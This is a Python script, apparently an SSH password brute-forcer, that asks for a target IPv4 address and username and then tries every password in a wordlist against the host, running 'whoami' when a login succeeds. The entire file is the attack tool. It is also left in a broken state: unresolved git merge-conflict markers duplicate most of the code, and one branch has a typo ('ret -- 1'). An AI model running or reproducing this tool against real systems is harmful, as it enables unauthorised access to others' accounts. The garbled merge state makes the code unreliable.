#!/usr/bin/python3

import pexpect, subprocess

PROMPT = ["# ", ">>> ", "> ", "\$ "]

def send_command(child, command):
	child.sendline(command)
	child.expect(PROMPT)
	print(f"\n{child.before.decode()}\n")

def connect(user, host, password):
<<<<<<< HEAD
	ssh_newkey = "Are you sure you want to continue connecting (yes/no)?"
	connStr = "ssh " + user + "@" + host
	child = pexpect.spawn(connStr)
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, "[P|p]assword: "])
	if (ret == 0):
		print("[X] Error Connecting... Please Try Again!")
	elif (ret -- 1):
		child.sendline("yes")
		ret = child.expect([pexpect.TIMEOUT, "[P|p]assword: "])
		if (ret == 0):
			print("[X] Error Connecting... Please Try Again!")
			return
	child.sendline(password)
	child.expect(PROMPT, timeout=0.2)
	return child

host = str(input("Target IPv4: "))
user = input("Target SSH Username: ")
mode = str(input("Do you know the password? [Y/N]: ")).upper()

def login():
	password = input("Target's SSH Password: ")
	child = connect(user, host, password)
	send_command(child, "whoami")

def attack():
	f = open("wordlist.txt", "r")
	for password in f.readlines():
		password = password.strip("\n")
		try:
			child = connect(user, host, password)
			print(f"[+] Password Found: {password}")
			send_command(child, "whoami")
		except:
			print(f"[x] Password Incorrect: {password}")
if mode == "Y":
=======
        ssh_newkey = "Are you sure you want to continue connecting (yes/no)?"
        connStr = "ssh " + user + "@" + host
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, ssh_newkey, "[P|p]assword: "])
        if (ret == 0):
                print("[X] Error Connecting... Please Try Again!")
        elif (ret == 1):
                child.sendline("yes")
                ret = child.expect([pexpect.TIMEOUT, "[P|p]assword: "])
                if (ret == 0):
                        print("[X] Error Connecting... Please Try Again!")
                        return
        child.sendline(password)
        child.expect(PROMPT, timeout=0.2)
        return child

host = str(input("Target IPv4: "))
user = input("Target SSH Username: ")
mode = str(input("Do you know the password? [Y/N]: ")).upper()

def login():
        password = input("Target's SSH Password: ")
        child = connect(user, host, password)
        send_command(child, "whoami")

def attack():
        f = open("wordlist.txt", "r")
        for password in f.readlines():
                password = password.strip("\n")
                try:
                        child = connect(user, host, password)
                        print(f"[+] Password Found: {password}")
                        send_command(child, "whoami")
                except:
                        print(f"[x] Password Incorrect: {password}")
if mode == "Y": 
>>>>>>> 995d57cf19f81ad43142608f1bc99b7acbe6c286
        login()
elif mode == "N":
        attack()
else:
        print("Error")
        exit(0)
